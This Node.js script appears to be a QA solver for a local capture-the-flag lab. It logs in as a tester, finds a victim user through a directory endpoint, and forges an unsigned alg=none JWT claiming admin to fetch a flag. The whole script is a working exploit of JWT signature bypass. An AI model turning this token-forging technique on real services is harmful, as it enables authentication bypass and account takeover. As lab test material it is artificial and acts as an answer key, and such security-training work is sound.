#!/usr/bin/env node
/*
 * VLH-CTF QA solver — DSLTV JWT/none-alg (NoneAlg).
 *
 * Intended path: log in as a tester → discover the innocent account via the
 * legit leak endpoint (GET /api/directory) → forge an alg=none token with the
 * gated claim pair (sub=<innocent>, role=admin) and an empty signature →
 * claim the flag at GET /flag/jwt. The verifier (vuln.js) trusts the header
 * alg claim and skips the signature check entirely for "none".
 *
 * Env: LAB (default http://localhost:8119). Vhosts are selected via the Host
 * header (victim.target.lab), so no DNS is needed.
 * Node 20+ built-ins only. Exit 0 only on a /DSLTV\{JWT-NoneAlg-\d+\}/ flag.
 */
import http from 'node:http';

const LAB = process.env.LAB || process.env.LAB_URL || 'http://localhost:8119';
const BASE = new URL(LAB);
const HOSTNAME = BASE.hostname;
const PORT = Number(BASE.port || 80);
const VICTIM = `victim.target.lab:${PORT}`;
const FLAG_RE = /^DSLTV\{JWT-NoneAlg-\d+\}$/;
const PROFILE = 'dsltv-jwt-none-alg';

const step = (m) => console.log(`[*] ${m}`);
const ok = (m) => console.log(`[+] ${m}`);
const fail = (m) => { console.error(`[-] ${m}`); process.exit(1); };

function request(method, path, { vhost = VICTIM, body, headers = {} } = {}) {
  return new Promise((resolve, reject) => {
    const payload = body === undefined ? null : (typeof body === 'string' ? body : JSON.stringify(body));
    const h = { host: vhost, ...headers };
    if (payload !== null && !h['content-type']) h['content-type'] = 'application/json';
    const req = http.request({ hostname: HOSTNAME, port: PORT, path, method, headers: h }, (res) => {
      const chunks = [];
      res.on('data', (c) => chunks.push(c));
      res.on('end', () => resolve({ status: res.statusCode, text: Buffer.concat(chunks).toString('utf8') }));
    });
    req.setTimeout(5000, () => req.destroy(new Error(`request timeout: ${method} ${path}`)));
    req.on('error', reject);
    if (payload !== null) req.write(payload);
    req.end();
  });
}

const asJson = (r) => { try { return JSON.parse(r.text); } catch (_) { return null; } };
const b64u = (obj) => Buffer.from(JSON.stringify(obj)).toString('base64url');

async function main() {
  step(`target ${LAB} (Host: ${VICTIM}) — profile ${PROFILE}`);

  /* 1. log in as the known tester → see the token shape + gate hint */
  const lr = await request('POST', '/login', { body: { username: '0xnhsec', password: 'vlh-tester-01' } });
  const lj = asJson(lr);
  if (lr.status !== 200 || !lj || !lj.token) fail(`tester login failed: HTTP ${lr.status} ${lr.text.slice(0, 200)}`);
  ok(`logged in as 0xnhsec (sub=${lj.sub} role=${lj.role}) — issued token is HS256, useless for the gate`);

  /* 2. discover the innocent identity via the legit leak endpoint */
  const dr = await request('GET', '/api/directory');
  const dj = asJson(dr);
  const innocent = dj && dj.users ? dj.users.find((u) => u.role === 'innocent') : null;
  if (!innocent) fail(`innocent not found in /api/directory: HTTP ${dr.status} ${dr.text.slice(0, 200)}`);
  ok(`innocent identity discovered: ${innocent.username}`);

  /* 3. forge: header alg=none, gated claim pair, empty signature (h.p.) */
  const header = { alg: 'none', typ: 'JWT' };
  const payload = { sub: innocent.username, role: 'admin', iat: Math.floor(Date.now() / 1000) };
  const forged = `${b64u(header)}.${b64u(payload)}.`;
  ok('forged unsigned token (alg=none, empty signature)');

  /* 4. claim the flag */
  const fr = await request('GET', '/flag/jwt', { headers: { authorization: `Bearer ${forged}` } });
  const fj = asJson(fr);
  if (fr.status === 200 && fj && fj.flag && FLAG_RE.test(fj.flag)) {
    ok(`FLAG ${fj.flag}`);
    process.exit(0);
  }
  fail(`/flag/jwt rejected the forged token: HTTP ${fr.status} ${fr.text.slice(0, 300)}`);
}

main().catch((e) => {
  if (e && (e.code === 'ECONNREFUSED' || e.code === 'ENOTFOUND' || e.code === 'EHOSTUNREACH')) {
    fail(`lab not running (${e.code} on ${LAB}) — start it: docker compose --profile ${PROFILE} up -d`);
  }
  fail(e && e.stack ? e.stack : String(e));
});
